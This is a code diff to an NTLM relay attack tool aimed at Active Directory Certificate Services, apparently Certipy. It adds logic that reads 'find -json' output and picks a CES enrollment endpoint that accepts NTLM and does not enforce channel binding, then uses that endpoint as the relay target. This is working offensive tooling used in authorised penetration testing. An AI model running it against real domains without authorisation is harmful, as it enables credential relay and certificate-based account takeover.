@@ -19,12 +19,13 @@ Key Components:
 
 import argparse
 import base64
+import json
 import os
 import struct
 import time
 from struct import unpack
 from threading import Lock
-from typing import Any, List, Literal, Optional, Tuple, Union, cast
+from typing import Any, Dict, List, Literal, Optional, Tuple, Union, cast
 
 import bs4
 import httpx
@@ -952,6 +953,71 @@ class ADCSRPCAttackClient(ProtocolAttack):
             self.adcs_relay.shutdown()
 
 
+def select_ces_endpoint(find_data: Dict[str, Any], ca: Optional[str] = None) -> str:
+    """
+    Choose the relayable CES endpoint from `certipy find -json` output.
+
+    An endpoint is relayable when it accepts Negotiate (Kerberos auth type,
+    which also accepts NTLM), does not enforce EPA, and was not found
+    unreachable. Endpoints that were not probed (DC-only mode) are kept.
+
+    Args:
+        find_data: Parsed JSON written by `certipy find -json`
+        ca: Optional CA name to choose between several relayable endpoints
+
+    Returns:
+        URL of the single relayable CES endpoint
+
+    Raises:
+        ValueError: If no endpoint, or more than one, is relayable
+    """
+    cas = find_data.get("Certificate Authorities") or {}
+    ca_entries = list(cas.values()) if isinstance(cas, dict) else list(cas)
+
+    if ca is not None:
+        ca_entries = [
+            entry
+            for entry in ca_entries
+            if str(entry.get("CA Name", "")).lower() == ca.lower()
+        ]
+        if not ca_entries:
+            raise ValueError(f"CA {ca!r} not found in find output")
+
+    relayable: List[Tuple[str, str]] = []
+    rejected: List[str] = []
+    for entry in ca_entries:
+        ca_name = str(entry.get("CA Name", "?"))
+        for endpoint in entry.get("Enrollment Web Service") or []:
+            if not isinstance(endpoint, dict) or not endpoint.get("uri"):
+                continue
+
+            uri = str(endpoint["uri"])
+            if "Kerberos" not in (endpoint.get("auth") or []):
+                rejected.append(f"{uri}: does not accept NTLM (Negotiate)")
+            elif endpoint.get("channel_binding") is True:
+                rejected.append(f"{uri}: EPA (channel binding) is enforced")
+            elif endpoint.get("reachable") is False:
+                rejected.append(f"{uri}: not reachable when find ran")
+            else:
+                relayable.append((ca_name, uri))
+
+    if not relayable:
+        if not rejected:
+            raise ValueError("No CES endpoints published in find output")
+        raise ValueError(
+            "No relayable CES endpoint in find output: " + "; ".join(rejected)
+        )
+
+    if len(relayable) > 1:
+        listing = "; ".join(f"{name}: {uri}" for name, uri in relayable)
+        raise ValueError(
+            "Multiple relayable CES endpoints; choose one with -ca or pass it as "
+            f"-target: {listing}"
+        )
+
+    return relayable[0][1]
+
+
 class Relay:
     """
     Main class for orchestrating NTLM relay attacks against AD CS.
@@ -962,7 +1028,7 @@ class Relay:
 
     def __init__(
         self,
-        target: str,
+        target: Optional[str] = None,
         ca: Optional[str] = None,
         template: Optional[str] = None,
         upn: Optional[str] = None,
@@ -983,6 +1049,7 @@ class Relay:
         timeout: int = 5,
         enum_templates: bool = False,
         ces: bool = False,
+        find_json: Optional[str] = None,
         **kwargs,  # type: ignore
     ):
         """
@@ -990,7 +1057,8 @@ class Relay:
 
         Args:
             target: Target AD CS server (http://server/certsrv/, rpc://server, or with
-                -ces https://server/<CA>_CES_<Auth>/service.svc/CES)
+                -ces https://server/<CA>_CES_<Auth>/service.svc/CES); optional with
+                -ces -find-json
             ca: Certificate Authority name (required for RPC)
             template: Certificate template to request
             upn: Alternative UPN (User Principal Name)
@@ -1011,10 +1079,9 @@ class Relay:
             timeout: Connection timeout in seconds
             enum_templates: Enumerate available templates instead of requesting certificate
             ces: Relay to a CES endpoint; target is kept verbatim as the CES URL
+            find_json: Path to 'certipy find -json' output used to pick the CES target (with -ces)
             kwargs: Additional arguments
         """
-        self.target = target
-        self.base_url = target  # Used only for HTTP(S) targets
         self.ca = ca
         self.template = template
         self.alt_upn = upn
@@ -1048,6 +1115,26 @@ class Relay:
 
         self.attacked_targets = []
         self.attack_lock = Lock()
+
+        if find_json and not ces:
+            logging.error("-find-json is only supported with -ces")
+            exit(1)
+
+        if ces and find_json:
+            try:
+                resolved = self._ces_target_from_find(target, find_json, ca)
+            except (OSError, ValueError) as e:
+                logging.error(f"Could not choose a CES target from {find_json!r}: {e}")
+                exit(1)
+            logging.info(f"Using CES endpoint from find output: {resolved}")
+            target = resolved
+
+        if not target:
+            logging.error("A target is required (-target), or use -ces with -find-json")
+            exit(1)
+
+        self.target: str = target
+        self.base_url: str = target  # Used only for HTTP(S) targets
 
         # Configure target based on URL or RPC string
         if self.target.startswith("rpc://"):
@@ -1154,6 +1241,30 @@ class Relay:
         config.setMode("RELAY")
 
         self.server = SMBRelayServer(config)
+
+    @staticmethod
+    def _ces_target_from_find(
+        target: Optional[str], find_json: str, ca: Optional[str]
+    ) -> str:
+        """
+        Resolve the CES target using 'certipy find -json' output.
+
+        An explicit CES URL in target wins and the file is not read. A bare host
+        keeps the path find reported but connects to the host the operator gave.
+        """
+        if target and Relay._build_ces_target(target)[2] != "/":
+            return target
+
+        with open(find_json, encoding="utf-8") as f:
+            data = json.load(f)
+        if not isinstance(data, dict):
+            raise ValueError("not a 'certipy find -json' file")
+
+        uri = select_ces_endpoint(data, ca)
+        if not target:
+            return uri
+        base_url = Relay._build_ces_target(target)[0]
+        return base_url + httpx.URL(uri).raw_path.decode()
 
     @staticmethod
     def _build_ces_target(target: str) -> Tuple[str, str, str]:
